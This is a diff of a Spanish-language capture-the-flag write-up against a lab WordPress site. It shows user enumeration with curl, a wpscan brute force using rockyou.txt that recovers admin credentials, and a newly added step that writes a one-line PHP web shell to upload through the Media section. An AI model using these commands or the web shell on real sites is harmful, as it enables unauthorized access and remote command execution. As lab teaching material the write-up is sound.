@@ -15,7 +15,7 @@ Lo primero que encontramos es en la ruta `htpp://<IP>/wp1/` así que nos encontr
 
 Encontramos el usuario `admin` con la comanda `curl -s -L http://<IP>/wp1/?author=1` y con esta información y mediante fuerza bruta con la herramienta `wpscan` y ejecutando el siguiente comando 
 
-```bash
+```sonsole
 wpscan --url http://10.0.2.12/wp1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --enumerate u --disable-tls-checks > wpscan-pass.txt
 ``` 
 sacamos las credenciales: `admin:spongebob`
@@ -26,7 +26,12 @@ sacamos las credenciales: `admin:spongebob`
 
 ### Flag 2 
 
-Una vez dentro del WordPress como admin...
+Una vez dentro del WordPress como admin y haciendo uso de la sección de Medios podemos subir una `reverse shell`
+
+```console
+echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+
+```
 
 ### Flag 3
 
